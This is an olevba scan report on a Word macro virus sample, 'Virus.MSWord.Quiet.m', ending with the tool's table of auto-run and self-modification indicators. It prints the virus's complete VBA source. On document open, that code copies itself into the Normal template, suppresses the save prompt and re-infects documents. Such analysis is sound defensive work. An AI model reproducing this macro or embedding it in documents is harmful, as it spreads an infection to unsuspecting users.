olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Quiet.m
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Quiet.m - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private source As Object
Private dest As Object

Private Sub Document_Close()

End Sub

Private Sub Document_New()

End Sub

Private Sub Document_open()
 
 Set source = ActiveDocument.VBProject.VBComponents.Item(1)
 Set dest = NormalTemplate.VBProject.VBComponents.Item(1)
 If dest.codemodule.countoflines = 0 Then
  For i = 1 To source.codemodule.countoflines
     dest.codemodule.insertlines i, source.codemodule.lines(i, 1)
  Next i
  Application.Options.SaveNormalPrompt = False
End If

If source.codemodule.countoflines = 0 Then
 For i = 1 To dest.codemodule.countoflines
  source.codemodule.insertlines i, dest.codemodule.lines(i, 1)
 Next i
 ActiveDocument.SaveAs (ActiveDocument.FullName)
 End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

